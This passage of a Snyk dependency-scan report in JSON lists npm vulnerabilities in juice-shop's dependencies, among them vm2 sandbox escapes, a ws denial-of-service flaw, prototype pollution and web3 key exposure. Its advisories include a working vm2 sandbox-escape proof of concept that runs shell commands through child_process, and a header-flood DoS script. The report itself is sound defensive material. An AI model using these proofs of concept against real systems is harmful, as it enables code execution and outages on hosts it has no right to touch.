**Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\n\n## Affected environments\n\nThe following environments are susceptible to a Prototype Pollution attack:\n\n-   Application server\n    \n-   Web server\n\n-   Web browser\n    \n\n## How to prevent\n\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\n    \n2.  Require schema validation of JSON input.\n    \n3.  Avoid using unsafe recursive merge functions.\n    \n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\n    \n5.  As a best practice use `Map` instead of `Object`.\n\n### For more information on this vulnerability type:\n\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\n\n## Remediation\nUpgrade `unset-value` to version 2.0.1 or higher.\n## References\n- [GitHub Commit](https://github.com/jonschlinkert/unset-value/pull/12/commits/abb534769f6ea62c3dd988f5ce0a4ebd1f91b561)\n- [GitHub Issue](https://github.com/jonschlinkert/unset-value/issues/11)\n- [GitHub PR](https://github.com/jonschlinkert/unset-value/pull/12)\n- [GitHub Release](https://github.com/jonschlinkert/unset-value/releases)\n",
        "epssDetails": null,
        "identifiers": {
          "CVE": [],
          "CWE": [
            "CWE-1321"
          ]
        },
        "packageName": "unset-value",
        "proprietary": false,
        "creationTime": "2022-02-13T14:46:07.185334Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2022-02-13T14:44:04Z",
        "exploitDetails": {
          "sources": [],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Not Defined",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Not Defined",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2022-02-13T15:26:38.063549Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2024-03-06T13:56:06.176520Z",
        "socialTrendAlert": false,
        "severityWithCritical": "high",
        "from": [
          "juice-shop@19.0.0",
          "check-dependencies@1.1.1",
          "findup-sync@2.0.0",
          "micromatch@3.1.10",
          "braces@2.3.2",
          "snapdragon@0.8.2",
          "base@0.11.2",
          "cache-base@1.0.1",
          "unset-value@1.0.0"
        ],
        "upgradePath": [
          false,
          "check-dependencies@2.0.0"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "unset-value",
        "version": "1.0.0"
      },
      {
        "id": "SNYK-JS-VM2-5537079",
        "title": "Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N/E:P",
        "credit": [
          "Takeshi Kaneko"
        ],
        "semver": {
          "vulnerable": [
            "<3.9.18"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "3.9.18"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 5.3,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "vm2",
        "references": [
          {
            "url": "https://github.com/patriksimek/vm2/commit/5206ba25afd86ef547a2c9d48d46ca7a9e6ec238",
            "title": "GitHub Commit"
          },
          {
            "url": "https://github.com/patriksimek/vm2/releases/tag/3.9.18",
            "title": "GitHub Release"
          },
          {
            "url": "https://gist.github.com/arkark/c1c57eaf3e0a649af1a70c2b93b17550",
            "title": "PoC"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "NVD",
            "severity": "medium",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
            "cvssV3BaseScore": 5.3,
            "modificationTime": "2024-03-11T09:53:15.875083Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 5.3,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-06T13:56:59.541484Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
            "assigner": "NVD",
            "severity": "medium",
            "baseScore": 5.3,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-11T09:53:15.875083Z"
          }
        ],
        "description": "## Overview\n[vm2](https://github.com/patriksimek/vm2#readme) is a sandbox that can run untrusted code with whitelisted Node's built-in modules.\n\nAffected versions of this package are vulnerable to Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection') via the `inspect` method of `vm.js`, which allows `write` permissions. \r\nExploiting this vulnerability allows an attacker to edit options for the `console.log` command.\r\n\r\n## Workaround\r\nUsers unable to upgrade may make the `inspect` method `readonly` with `vm.readonly(inspect)` after creating a VM.\n## Remediation\nUpgrade `vm2` to version 3.9.18 or higher.\n## References\n- [GitHub Commit](https://github.com/patriksimek/vm2/commit/5206ba25afd86ef547a2c9d48d46ca7a9e6ec238)\n- [GitHub Release](https://github.com/patriksimek/vm2/releases/tag/3.9.18)\n- [PoC](https://gist.github.com/arkark/c1c57eaf3e0a649af1a70c2b93b17550)\n",
        "epssDetails": {
          "percentile": "0.70145",
          "probability": "0.00653",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2023-32313"
          ],
          "CWE": [
            "CWE-74"
          ],
          "GHSA": [
            "GHSA-p5gc-c584-jj6v"
          ]
        },
        "packageName": "vm2",
        "proprietary": false,
        "creationTime": "2023-05-16T08:07:30.028918Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2023-05-16T07:52:13Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2023-05-16T08:18:20.099998Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2024-03-11T09:53:15.875083Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "juice-shop@19.0.0",
          "juicy-chat-bot@0.9.0",
          "vm2@3.9.17"
        ],
        "upgradePath": [],
        "isUpgradable": false,
        "isPatchable": false,
        "name": "vm2",
        "version": "3.9.17"
      },
      {
        "id": "SNYK-JS-VM2-5537100",
        "title": "Sandbox Bypass",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P",
        "credit": [
          "Takeshi Kaneko"
        ],
        "semver": {
          "vulnerable": [
            "<3.9.18"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "3.9.18"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "critical",
        "cvssScore": 9.8,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "vm2",
        "references": [
          {
            "url": "https://github.com/patriksimek/vm2/commit/d88105f99752305c5b8a77b63ddee3ec86912daf",
            "title": "GitHub Commit"
          },
          {
            "url": "https://gist.github.com/arkark/e9f5cf5782dec8321095be3e52acf5ac",
            "title": "GitHub Gist"
          },
          {
            "url": "https://github.com/patriksimek/vm2/releases/tag/3.9.18",
            "title": "GitHub Release"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "NVD",
            "severity": "critical",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
            "cvssV3BaseScore": 10,
            "modificationTime": "2024-03-11T09:53:15.879124Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P",
            "assigner": "Snyk",
            "severity": "critical",
            "baseScore": 9.8,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-06T13:57:06.387100Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
            "assigner": "NVD",
            "severity": "critical",
            "baseScore": 10,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-11T09:53:15.879124Z"
          }
        ],
        "description": "## Overview\n[vm2](https://github.com/patriksimek/vm2#readme) is a sandbox that can run untrusted code with whitelisted Node's built-in modules.\n\nAffected versions of this package are vulnerable to Sandbox Bypass by abusing an unexpected creation of a host object based on the maliciously crafted specification of `Proxy`.\r\nExploiting this vulnerability allows an attacker to gain remote code execution rights on the host running the sandbox via the `Function` constructor.\n## PoC\n```js\r\nconst { VM } = require(\"vm2\");\r\nconst vm = new VM();\r\n\r\nconst code = `\r\n  const err = new Error();\r\n  err.name = {\r\n    toString: new Proxy(() => \"\", {\r\n      apply(target, thiz, args) {\r\n        const process = args.constructor.constructor(\"return process\")();\r\n        throw process.mainModule.require(\"child_process\").execSync(\"echo hacked\").toString();\r\n      },\r\n    }),\r\n  };\r\n  try {\r\n    err.stack;\r\n  } catch (stdout) {\r\n    stdout;\r\n  }\r\n`;\r\n\r\nconsole.log(vm.run(code)); // -> hacked\r\n```\n## Remediation\nUpgrade `vm2` to version 3.9.18 or higher.\n## References\n- [GitHub Commit](https://github.com/patriksimek/vm2/commit/d88105f99752305c5b8a77b63ddee3ec86912daf)\n- [GitHub Gist](https://gist.github.com/arkark/e9f5cf5782dec8321095be3e52acf5ac)\n- [GitHub Release](https://github.com/patriksimek/vm2/releases/tag/3.9.18)\n",
        "epssDetails": {
          "percentile": "0.98616",
          "probability": "0.69492",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2023-32314"
          ],
          "CWE": [
            "CWE-265"
          ],
          "GHSA": [
            "GHSA-whpj-8f3w-67p5"
          ]
        },
        "packageName": "vm2",
        "proprietary": false,
        "creationTime": "2023-05-16T08:35:19.310061Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2023-05-15T20:50:51Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2023-05-16T10:07:04.650908Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2024-03-11T09:53:15.879124Z",
        "socialTrendAlert": false,
        "severityWithCritical": "critical",
        "from": [
          "juice-shop@19.0.0",
          "juicy-chat-bot@0.9.0",
          "vm2@3.9.17"
        ],
        "upgradePath": [],
        "isUpgradable": false,
        "isPatchable": false,
        "name": "vm2",
        "version": "3.9.17"
      },
      {
        "id": "SNYK-JS-VM2-5772823",
        "title": "Remote Code Execution (RCE)",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P",
        "credit": [
          "SeungHyun Lee"
        ],
        "semver": {
          "vulnerable": [
            "*"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "critical",
        "cvssScore": 9.8,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "vm2",
        "references": [
          {
            "url": "https://github.com/patriksimek/vm2/issues/533",
            "title": "GitHub Issue"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "NVD",
            "severity": "critical",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
            "cvssV3BaseScore": 10,
            "modificationTime": "2024-03-11T09:53:27.824223Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P",
            "assigner": "Snyk",
            "severity": "critical",
            "baseScore": 9.8,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-06T14:09:14.671716Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
            "assigner": "NVD",
            "severity": "critical",
            "baseScore": 10,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-11T09:53:27.824223Z"
          }
        ],
        "description": "## Overview\n[vm2](https://github.com/patriksimek/vm2#readme) is a sandbox that can run untrusted code with whitelisted Node's built-in modules.\n\nAffected versions of this package are vulnerable to Remote Code Execution (RCE) due to insufficient checks which allow an attacker to escape the sandbox.\r\n\r\n**Note:**\r\n\r\nAccording to the maintainer, the security issue cannot be properly addressed and the library will be discontinued.\n## Remediation\nThere is no fixed version for `vm2`.\n## References\n- [GitHub Issue](https://github.com/patriksimek/vm2/issues/533)\n",
        "epssDetails": {
          "percentile": "0.96914",
          "probability": "0.35568",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2023-37903"
          ],
          "CWE": [
            "CWE-94"
          ]
        },
        "packageName": "vm2",
        "proprietary": false,
        "creationTime": "2023-07-12T14:23:22.486382Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2023-07-12T14:10:56Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2023-07-12T14:50:43.988574Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2024-03-11T09:53:27.824223Z",
        "socialTrendAlert": false,
        "severityWithCritical": "critical",
        "from": [
          "juice-shop@19.0.0",
          "juicy-chat-bot@0.9.0",
          "vm2@3.9.17"
        ],
        "upgradePath": [],
        "isUpgradable": false,
        "isPatchable": false,
        "name": "vm2",
        "version": "3.9.17"
      },
      {
        "id": "SNYK-JS-VM2-5772825",
        "title": "Remote Code Execution (RCE)",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:F",
        "credit": [
          "SeungHyun Lee"
        ],
        "semver": {
          "vulnerable": [
            "*"
          ]
        },
        "exploit": "Functional",
        "fixedIn": [],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "critical",
        "cvssScore": 9.8,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "vm2",
        "references": [
          {
            "url": "https://github.com/patriksimek/vm2/issues/533",
            "title": "GitHub Issue"
          },
          {
            "url": "https://www.exploit-db.com/exploits/51898",
            "title": "Exploit DB"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "NVD",
            "severity": "critical",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
            "cvssV3BaseScore": 10,
            "modificationTime": "2024-03-11T09:53:27.053027Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:F",
            "assigner": "Snyk",
            "severity": "critical",
            "baseScore": 9.8,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-06T14:09:53.667607Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
            "assigner": "NVD",
            "severity": "critical",
            "baseScore": 10,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-11T09:53:27.053027Z"
          }
        ],
        "description": "## Overview\n[vm2](https://github.com/patriksimek/vm2#readme) is a sandbox that can run untrusted code with whitelisted Node's built-in modules.\n\nAffected versions of this package are vulnerable to Remote Code Execution (RCE) such that the `Promise` handler sanitization can be bypassed, allowing attackers to escape the sandbox. \r\n\r\n**Note:**\r\n\r\nAccording to the maintainer, the security issue cannot be properly addressed and the library will be discontinued.\n## Remediation\nThere is no fixed version for `vm2`.\n## References\n- [GitHub Issue](https://github.com/patriksimek/vm2/issues/533)\n- [Exploit DB](https://www.exploit-db.com/exploits/51898)\n",
        "epssDetails": {
          "percentile": "0.88994",
          "probability": "0.04732",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2023-37466"
          ],
          "CWE": [
            "CWE-94"
          ],
          "GHSA": [
            "GHSA-4g2x-vq5p-5vj6",
            "GHSA-cchq-frgv-rjh5"
          ]
        },
        "packageName": "vm2",
        "proprietary": false,
        "creationTime": "2023-07-12T14:23:33.336819Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2023-07-12T14:20:17Z",
        "exploitDetails": {
          "sources": [
            "ExploitDB",
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Functional",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2023-07-12T14:50:28.303109Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2024-06-03T08:53:02.295934Z",
        "socialTrendAlert": false,
        "severityWithCritical": "critical",
        "from": [
          "juice-shop@19.0.0",
          "juicy-chat-bot@0.9.0",
          "vm2@3.9.17"
        ],
        "upgradePath": [],
        "isUpgradable": false,
        "isPatchable": false,
        "name": "vm2",
        "version": "3.9.17"
      },
      {
        "id": "SNYK-JS-WEB3-174533",
        "title": "Insecure Credential Storage",
        "CVSSv3": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N",
        "credit": [
          "sshelton76"
        ],
        "semver": {
          "vulnerable": [
            "*"
          ]
        },
        "exploit": "Not Defined",
        "fixedIn": [],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "low",
        "cvssScore": 3.3,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "web3",
        "references": [
          {
            "url": "https://github.com/ethereum/web3.js/issues/2739",
            "title": "GitHub Issue"
          },
          {
            "url": "https://github.com/web3/web3.js/issues/6913",
            "title": "GitHub Issue"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N",
            "assigner": "Snyk",
            "severity": "low",
            "baseScore": 3.3,
            "cvssVersion": "3.1",
            "modificationTime": "2024-11-07T13:05:02.752265Z"
          }
        ],
        "description": "## Overview\n[web3](https://www.npmjs.com/package/web3) is a JavaScript API which connects to the Generic JSON RPC spec.\n\nAffected versions of this package are vulnerable to Insecure Credential Storage. The current implementation of web3.js could result in wallet decryption under certain circumstances. When a wallet is saved and encrypted into local storage, a private key is needed to load the wallet. However, this private key is available via LocalStorage and is readable in plaintext on a webpage after a wallet is loaded. \r\n\r\nThis implementation could be abused by an attacker through client-side attacks such as Cross-site Scripting (XSS) and could result in theft of a user's wallet private key.\n## Remediation\nThere is no fixed version for `web3`.\n## References\n- [GitHub Issue](https://github.com/ethereum/web3.js/issues/2739)\n- [GitHub Issue](https://github.com/web3/web3.js/issues/6913)\n",
        "epssDetails": null,
        "identifiers": {
          "CVE": [],
          "CWE": [
            "CWE-256"
          ],
          "NSP": [
            "877"
          ],
          "GHSA": [
            "GHSA-27v7-qhfv-rqq8"
          ]
        },
        "packageName": "web3",
        "proprietary": false,
        "creationTime": "2019-04-28T10:16:40.300717Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2019-04-26T08:48:18Z",
        "exploitDetails": {
          "sources": [],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Not Defined",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Not Defined",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2019-04-28T12:03:31Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2024-11-07T13:05:02.752265Z",
        "socialTrendAlert": false,
        "severityWithCritical": "low",
        "from": [
          "juice-shop@19.0.0",
          "web3@4.16.0"
        ],
        "upgradePath": [],
        "isUpgradable": false,
        "isPatchable": false,
        "name": "web3",
        "version": "4.16.0"
      },
      {
        "id": "SNYK-JS-WS-7266574",
        "title": "Denial of Service (DoS)",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
        "credit": [
          "Ryan LaPointe"
        ],
        "semver": {
          "vulnerable": [
            ">=2.1.0 <5.2.4",
            ">=6.0.0 <6.2.3",
            ">=7.0.0 <7.5.10",
            ">=8.0.0 <8.17.1"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "5.2.4",
          "6.2.3",
          "7.5.10",
          "8.17.1"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "high",
        "cvssScore": 7.5,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "ws",
        "references": [
          {
            "url": "https://github.com/websockets/ws/commit/22c28763234aa75a7e1b76f5c01c181260d7917f",
            "title": "GitHub Commit"
          },
          {
            "url": "https://github.com/websockets/ws/commit/4abd8f6de4b0b65ef80b3ff081989479ed93377e",
            "title": "GitHub Commit"
          },
          {
            "url": "https://github.com/websockets/ws/commit/e55e5106f10fcbaac37cfa89759e4cc0d073a52c",
            "title": "GitHub Commit"
          },
          {
            "url": "https://github.com/websockets/ws/commit/eeb76d313e2a00dd5247ca3597bba7877d064a63",
            "title": "GitHub Commit"
          },
          {
            "url": "https://github.com/websockets/ws/issues/2230",
            "title": "GitHub Issue"
          },
          {
            "url": "https://github.com/websockets/ws/pull/2231",
            "title": "GitHub PR"
          },
          {
            "url": "https://github.com/websockets/ws/releases/tag/8.17.1",
            "title": "GitHub Release"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "Red Hat",
            "severity": "medium",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H",
            "cvssV3BaseScore": 5.9,
            "modificationTime": "2024-08-21T13:36:47.485619Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
            "assigner": "Snyk",
            "severity": "high",
            "baseScore": 7.5,
            "cvssVersion": "3.1",
            "modificationTime": "2024-11-14T13:19:29.299224Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H",
            "assigner": "Red Hat",
            "severity": "medium",
            "baseScore": 5.9,
            "cvssVersion": "3.1",
            "modificationTime": "2024-08-21T13:36:47.485619Z"
          }
        ],
        "description": "## Overview\n[ws](https://www.npmjs.com/package/ws) is a simple to use websocket client, server and console for node.js.\n\nAffected versions of this package are vulnerable to Denial of Service (DoS) when the number of received headers exceed the `server.maxHeadersCount` or `request.maxHeadersCount` threshold.\r\n\r\n## Workaround\r\n\r\nThis issue can be mitigating by following these steps:\r\n\r\n1. Reduce the maximum allowed length of the request headers using the `--max-http-header-size=size` and/or the `maxHeaderSize` options so\r\nthat no more headers than the `server.maxHeadersCount` limit can be sent.\r\n\r\n2. Set `server.maxHeadersCount` to 0 so that no limit is applied.\n## PoC\n```js\r\n\r\nconst http = require('http');\r\nconst WebSocket = require('ws');\r\n\r\nconst server = http.createServer();\r\n\r\nconst wss = new WebSocket.Server({ server });\r\n\r\nserver.listen(function () {\r\n  const chars = \"!#$%&'*+-.0123456789abcdefghijklmnopqrstuvwxyz^_`|~\".split('');\r\n  const headers = {};\r\n  let count = 0;\r\n\r\n  for (let i = 0; i < chars.length; i++) {\r\n    if (count === 2000) break;\r\n\r\n    for (let j = 0; j < chars.length; j++) {\r\n      const key = chars[i] + chars[j];\r\n      headers[key] = 'x';\r\n\r\n      if (++count === 2000) break;\r\n    }\r\n  }\r\n\r\n  headers.Connection = 'Upgrade';\r\n  headers.Upgrade = 'websocket';\r\n  headers['Sec-WebSocket-Key'] = 'dGhlIHNhbXBsZSBub25jZQ==';\r\n  headers['Sec-WebSocket-Version'] = '13';\r\n\r\n  const request = http.request({\r\n    headers: headers,\r\n    host: '127.0.0.1',\r\n    port: server.address().port\r\n  });\r\n\r\n  request.end();\r\n});\r\n\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.\n\nUnlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.\n\nOne popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.\n\nWhen it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.\n\nTwo common types of DoS vulnerabilities:\n\n* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](https://security.snyk.io/vuln/SNYK-JAVA-COMMONSFILEUPLOAD-30082).\n\n* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)\n\n## Remediation\nUpgrade `ws` to version 5.2.4, 6.2.3, 7.5.10, 8.17.1 or higher.\n## References\n- [GitHub Commit](https://github.com/websockets/ws/commit/22c28763234aa75a7e1b76f5c01c181260d7917f)\n- [GitHub Commit](https://github.com/websockets/ws/commit/4abd8f6de4b0b65ef80b3ff081989479ed93377e)\n- [GitHub Commit](https://github.com/websockets/ws/commit/e55e5106f10fcbaac37cfa89759e4cc0d073a52c)\n- [GitHub Commit](https://github.com/websockets/ws/commit/eeb76d313e2a00dd5247ca3597bba7877d064a63)\n- [GitHub Issue](https://github.com/websockets/ws/issues/2230)\n- [GitHub PR](https://github.com/websockets/ws/pull/2231)\n- [GitHub Release](https://github.com/websockets/ws/releases/tag/8.17.1)\n",
        "epssDetails": {
          "percentile": "0.66724",
          "probability": "0.00541",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2024-37890"
          ],
          "CWE": [
            "CWE-400"
          ]
        },
        "packageName": "ws",
        "proprietary": false,
        "creationTime": "2024-06-17T14:34:03.689299Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2024-06-16T13:35:43Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2024-06-17T14:34:03.928602Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2024-11-14T13:19:29.299224Z",
        "socialTrendAlert": false,
        "severityWithCritical": "high",
        "from": [
          "juice-shop@19.0.0",
          "socket.io@3.1.2",
          "engine.io@4.1.2",
          "ws@7.4.6"
        ],
        "upgradePath": [
          false,
          "socket.io@4.7.0",
          "engine.io@6.5.5",
          "ws@8.17.1"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "ws",
        "version": "7.4.6"
      },
      {
        "id": "npm:base64url:20180511",
        "title": "Uninitialized Memory Exposure",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:H/E:F/RL:O/RC:C",
        "credit": [
          "ChALkeR"
        ],
        "semver": {
          "vulnerable": [
            "<3.0.0"
          ]
        },
        "exploit": "Functional",
        "fixedIn": [
          "3.0.0"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "high",
        "cvssScore": 7.1,
        "functions": [
          {
            "version": [
              "<=1.0.6"
            ],
            "functionId": {
              "filePath": "index.js",
              "className": null,
              "functionName": "padString"
            }
          },
          {
            "version": [
              ">=2.0.0 <3.0.0"
            ],
            "functionId": {
              "filePath": "dist/pad-string.js",
              "className": null,
              "functionName": "padString"
            }
          }
        ],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "base64url",
        "references": [
          {
            "url": "https://github.com/brianloveswords/base64url/commit/4355cb294123e86171daa9389f7afe6d2b2b9dae",
            "title": "GitHub Commit"
          },
          {
            "url": "https://hackerone.com/reports/321687",
            "title": "HackerOne Report"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:H/E:F/RL:O/RC:C",
            "assigner": "Snyk",
            "severity": "high",
            "baseScore": 7.1,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-06T14:03:35.868977Z"
          }
        ],
